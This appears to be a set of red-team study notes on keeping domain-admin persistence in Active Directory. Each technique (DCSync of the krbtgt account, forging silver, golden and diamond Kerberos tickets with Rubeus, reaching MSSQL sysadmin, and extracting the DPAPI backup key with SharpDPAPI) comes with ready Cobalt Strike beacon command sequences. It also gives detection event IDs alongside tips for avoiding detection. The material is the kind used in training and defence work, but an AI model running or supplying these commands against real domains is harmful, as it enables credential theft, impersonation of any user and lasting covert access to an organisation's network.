if an adversary has gained domain admin privileges, they extract highly-sensitive authentication material to ensure they can maintain this level of privilege almost indefinitely.
## DCSync
Abuses the Directory Replication Service (DRS) protocol to trick a Domain Controller (DC) into synchronizing account data to an unauthorized requester. Requests password hashes via replication rather than dumping NTDS.dit.

Requirements
	Domain Admin, Enterprise Admin, or DC Computer accounts

We are free to pull any or all data from DC, but common target is `krbtgt` account so we can forge legitimate TGTs for any user in the domain. Less noisy as well

OPSEC
	For defenders, DRS is legit so we must look for anomalous replication requests like IPs that are not known DCs
	DRS logged as 4662 events
		`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` 
			DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
		`89e95b76-444d-4c62-991a-0facbeda640c`
			**DS-Replication-Get-Changes-In-Filtered-Set**.

```powershell
# impersonate a domain admin
beacon> make_token [DOMAIN]\[user] [password]

# dc sync -- capture domain krbtgt hash
beacon> dcsync [domain.com] [DOMAIN]\krbtgt

# dc sync -- capture computer account
beacon> dcsync [domain.com] [DOMAIN]\[hostname]$
```

## Ticket Forgery
Ticket forgery is a technique where an adversary uses stolen secrets to create their own Kerberos tickets offline and inject them into a logon session for use.
#### Silver Tickets
Forged using a service's secret and used to target a specific service on a specific machine.

Use-cases
	Maintain local admin access to machines after compromise without relying on original means for access
	Another use-case for silver tickets is when combined with other attacks that allow you to access service secrets, such as Kerberoasting.
		ie: we have a SQL service account password with no sysadmin privs on MSSQL db (this is default)... We could forge a service ticket for MSSQL service and impersonate a sysadmin user

Downside
	computer account secrets are auto-changed by AD every 30 days by default

OPSEC
	Silver tickets can be effectively mitigated when PAC validation is enabled on computers.
		If computer secret is used to sign the ticket instead of `krbtgt`, it will fail against KDC.
	Detection by event codes
		Normal ticket exchange = TGS-REQ (4769) and TGS-REP, and Usage (4624)
		Forgery will only have 4624 (because forged offline)
	Detected if forged with inaccurate info
		ie: Kerberos realm should be all UPPERCASE to blend in

Abusing Silver Ticket for Persistance
```powershell
# Craft ticket offline
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
	# /service = the target service.
	# /aes256 = the AES256 hash of the target computer account.
	# /user = the username to impersonate.
	# /domain = the FQDN of the computer's domain.
	# /sid = the domain SID.
	# /id and /group may be used to change the default RIDs

## FROM HIGH-INTEGRITY
# Impersonate User
beacon> make_token CONTOSO\Administrator FakePass

# Inject Silver Ticket into Session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x

beacon> run klist # BAD OPSEC

# Abuse
beacon> ls \\lon-db-1\c$

# Clean up cache (OPSEC -- helps to avoid detection i guess???)
beacon> run klist purge

# Revert session token
rev2self
```

Abusing Silver Ticket to gain MSSQL sysadmin access
```powershell
# Convert plaintext mssql_svc password to a hash
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

# Forge a service ticket for MSSQLSvc, using RIDs of a sysadmin (ie: rsteel)
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

# Impersonate MSSQL sysadmin
beacon> make_token CONTOSO\rsteel FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[ticket]
beacon> run klist        # BAD OPSEC
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info # Getting info
```

#### Golden Tickets
A 'golden ticket' is a forged TGT that has been signed with the KDC's secret. Usually obtained via DCSync after obtaining DA. 

Can forge valid TGTs for any user in the domain and by extension, request service tickets as any user, to any service. When a golden ticket is injected and a service accessed, Windows will use the injected TGT to obtain the necessary service tickets using the typical TGS-REQ/TGS-REP process..

OPSEC
	Detection by Event codes
		Service ticket = TGS-REQ w/ valid TGT (4769), and AS-REQ by the user (4768)
		Forgery and getting access to service = (4769) only
	Detection by anomalous ticket data
		ie: default ticket lifetime is 10 hrs, mimikatz default lifetime is 10 years

Abusing Golden Tickets
```powershell
# Craft golden ticket offline
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
    # /aes256 = the AES256 hash for the krbtgt account.
    # /user = the username to impersonate.
    # /domain = the current domain.
    # /sid = the current domain's SID.

# Impersonate user and inject TGT into session
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N
beacon> run klist             # BAD OPSEC
beacon> ls \\lon-dc-1\c$      # ABUSE
```

#### Diamond Tickets
Unlike silver and golden tickets, diamond tickets are not forged offline. They are created by requesting a legitimate TGT for a user and the KDC's secret is used to decrypt the internal info, re-encrypt the ticket and resign with the KDC's secret.

Use-case
	All peripheral information in the ticket is in-line with domain policy
	More difficult to detect based on missing AS-REQs

OPSEC
	You'll notice that some fields, such as the FullName, is still that of the original TGT, which may be a potential point of detection.

Abusing Diamond Tickets
```powershell
# Create diamond ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
    # /tgtdeleg uses the TGT delegation trick to obtain a usable TGT for the current user without needing credentials.
    # /krbkey is the krbtgt's AES256 hash.
    # /ticketuser is the user we want to impersonate.
    # /ticketuserid is the impersonated user's RID.
    # /domain is the current domain.

# Use describe to show ticket info
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==
	# /servicekey = krbtgt's AES256 hash.

# Impersonate user and inject into session
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=
beacon> run klist             # BAD OPSEC
beacon> ls \\lon-dc-1\c$      # Abuse
```

## DPAPI Backup Keys
Recall that some secrets like those stored in Windows Cred Manager are protected using DPAPI. The private key DPAPI uses to decrypt secrets is derived from users password, but once's the pass is changed, DPAPI can no longer generate keys to decrypt the master key. 

The DPAPI backup key is randomly generated during the initial creation of the domain, and like the krbtgt secret, is never automatically changed. 

Why capture DPAPI backup key?
	Allows us to decrypt all DPAPI blobs, and maintain access to sensitive credentials.

Abusing DPAPI Keys
```powershell
# Impersonate DA
beacon> make_token CONTOSO\dyork Passw0rd!

# Extract DPAPI keys (REQUIRES HIGH-INTEGRITY)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

# Enumerate secrets for users on computer  
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[DPAPI KEY]
```